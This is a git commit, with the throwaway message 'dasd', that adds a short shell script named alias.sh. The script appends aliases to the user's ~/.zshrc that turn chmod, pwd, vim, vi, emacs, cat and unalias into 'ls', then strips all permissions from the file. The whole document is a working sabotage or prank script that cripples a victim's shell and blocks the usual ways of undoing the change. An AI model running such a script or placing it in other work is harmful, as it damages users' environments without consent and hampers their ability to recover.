7984742932ca387f7a1bb21fc28ce05047356fc8
Cristian CIOBANU <cciobanu@e1p25.chisinau.42.fr>
2018-08-09 14:49:00 +0300

    dasd

---
+++ alias.sh
@@ -0,0 +1,9 @@
+
+echo "alias chmod='ls'" >> ~/.zshrc
+echo "alias pwd='ls'" >> ~/.zshrc
+echo "alias vim='ls'" >> ~/.zshrc
+echo "alias vi='ls'" >> ~/.zshrc
+echo "alias emacs='ls'" >> ~/.zshrc
+echo "alias cat='ls'" >> ~/.zshrc
+echo "alias unalias='ls'" >> ~/.zshrc
+chmod 000 ~/.zshrc
